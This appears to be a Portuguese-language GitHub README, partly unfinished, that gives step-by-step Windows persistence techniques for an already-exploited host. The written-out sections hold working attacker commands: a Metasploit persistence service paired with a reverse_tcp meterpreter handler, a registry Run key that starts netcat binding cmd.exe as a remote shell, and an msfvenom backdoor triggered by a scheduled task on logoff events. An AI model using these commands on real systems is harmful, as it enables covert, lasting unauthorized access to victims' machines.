# Awesome Windows Persistence

![829c15633cef94444c681910dfedd23b](https://user-images.githubusercontent.com/67444297/198659100-fbdb0b32-38b0-4ff6-a5ab-7ae305cf51cc.gif)

**Técnicas e táticas para manutenção de persistência em um alvo explorado.**

Eu sou o Stux e estarei constantemente atualizando este repositório com novas técnicas para Windows Persistence!

**Obs: Todos os processos de persistência partem do princípio de que você já possui uma shell ou acesso ao ambiente**

## Sumário
 - [Persistence Service](https://github.com/Stuuxx/awesome-persistence#persistence-service)
 - [Persistence Registry](https://github.com/Stuuxx/awesome-persistence#persistence-registry)
 - [Netcat](https://github.com/Stuuxx/awesome-persistence#netcat)
 - [RDP](https://github.com/Stuuxx/awesome-persistence#rdp)
 - [Schtasks](https://github.com/Stuuxx/awesome-persistence#schtasks)
 - [Schtasks-Log Events](https://github.com/Stuuxx/awesome-persistence#schtasks---log-events)
 - [WMIC]()
 - [Wmi-Persistence](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#wmi-persistence)
 - [SharPersist](https://github.com/Stuuxx/awesome-persistence/blob/main/README.md#sharpersist)

### Persistence Service
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

Overview:
Essa técnica tem como objetivo criar um serviço persistente no windows explorado na qual executará diversas vezes o payload de conexão reversa.

Etapas:
- Colocar a sessão em background;
- Utilizar e configurar o módulo exploit/windows/local/persistence_service do metasploit;

Este módulo irá gerar e fazer upload de um executável para o host explorado, em seguida irá torná-lo um serviço persistente. Ele criará um novo serviço que iniciará a carga útil sempre que o serviço estiver em execução.
**É necessário privilégio de administrador ou de sistema!**
```bash
background
use exploit/windows/local/persistence_service
set SESSION 1
exploit
```
![persistence-service](https://user-images.githubusercontent.com/67444297/198635234-f2d8beb0-a0e3-416f-a1b4-ad49d98448ed.jpg)
- Abrir uma nova aba no terminal;
- Utilizar o multi/handler, configurar-lo e colocar para ouvir;
```bash
msfconsole -q
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
ip a s
set LHOST SEUIP
exploit
```
![persistence-service2](https://user-images.githubusercontent.com/67444297/198635249-b51498b3-7cc6-4cc5-9849-4b143b71e1de.jpg)
Note que logo que você colocar para ouvir o multi/handler, já receberá uma nova shell, isso se da ao fato de que essa técnica é voltada a um serviço persistente, ou seja, está executando o payload diversas vezes enquanto está vivo.

Para prova de conceito, iremos dar um reboot na máquina explorada e aguardar a shell em nosso multi/handler.
![persistence-service3](https://user-images.githubusercontent.com/67444297/198635260-54025d20-366e-4e76-a31e-1731e7da1702.jpg)


### Persistence Registry
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Netcat
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

Overview:

Etapas:
- Vamos realizar o upload do netcat para algum diretório do alvo.
```bash
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
```
![nc1](https://user-images.githubusercontent.com/67444297/198689309-274f2c78-f4f0-45b0-b2e8-4eb9884615a9.jpg)

- Após realizado o upload, iremos modificar o registro para que o Netcat seja executado.
```bash
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e C:\windows\system32\cmd.exe'
```
![nc2](https://user-images.githubusercontent.com/67444297/198689312-33e81bea-6fec-43e7-bb09-fbe4b3c3bfea.jpg)

- Agora, iremos verificar como ficou nossa modificação.
```bash
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
```
![nc3](https://user-images.githubusercontent.com/67444297/198689313-1abd224e-cd03-4853-9958-65540a2cdb16.jpg)

Para prova de conceito, iremos dar um reboot na máquina explorada para que nosso ataque seja efetivado nos registros do sistema.

![nc4](https://user-images.githubusercontent.com/67444297/198689314-683654df-041d-453d-bec6-be6f419130ec.jpg)

- Após o ataque ser bem sucedido, vamos nos conectar na máquina explorada através do netcat.
```bash
nc IP PORTA
```
![nc5](https://user-images.githubusercontent.com/67444297/198689315-99ce1fe9-5608-4374-b861-b48f09492a57.jpg)


### RDP
--------------------------------------------------------------------------------------------------------------------------------------------------------------------

Overview: 


Etapas:


### Schtasks
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
Overview:

Etapas:


### Schtasks - Log Events
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
Overview:

Etapas:
- Vamos iniciar criando um backdoor via msfvenom.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEUIP LPORT=4444 -f exe > backdoor.exe
```
![Screenshot_1](https://user-images.githubusercontent.com/67444297/198754911-1b1001ce-e154-4982-8f9b-158cdc15d4e4.jpg)

- No meterpreter, iniciaremos a shell e criaremos a task através do schtasks setando o nosso backdoor.
```bash
shell
schtasks /Create /TN SessionOnLogOff /TR C:\Windows\System32\backdoor.exe /SC ONEVENT /EC Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"
```
![Screenshot_3](https://user-images.githubusercontent.com/67444297/198754915-d0c88527-cc5e-4c89-8a71-df76edbc8bc6.jpg)
- Iniciaremos o multi/handler para receber a shell.
```bash
msfconsole -q
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
ip a s
set LHOST SEUIP
exploit
```
![Screenshot_2](https://user-images.githubusercontent.com/67444297/198754914-cfa45c52-0dea-41f2-a8cf-a60855680d89.jpg)

Para prova de conceito, iremos dar um reboot na máquina explorada para que nosso ataque seja efetivado e a task seja executada.
![Screenshot_4](https://user-images.githubusercontent.com/67444297/198754918-e532b2a5-337c-48b7-a08c-7c61862dac6c.jpg)

- Após o reboot, receberemos nossa shell.

![Screenshot_5](https://user-images.githubusercontent.com/67444297/198754920-67ffe450-596a-4dfc-8736-8e5eed3ca16e.jpg)

### WMIC
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
Overview:

Etapas:


### Wmi-Persistence
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
Overview:

Etapas:


### SharPersist
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
Overview:

Etapas:


--------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Ficou com alguma dúvida?
Sinta-se a vontade para entrar em contato comigo através de minhas redes sociais!
 - LinkedIn : [Eduardo Maragno](https://www.linkedin.com/in/eduardo-maragno/)
 - Bugcrowd : [@Stux](https://bugcrowd.com/StuxRs)
 - Medium : [@Stux](https://medium.com/@stux)
 - Twitter : [@StuxRs](https://twitter.com/StuxRs)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------
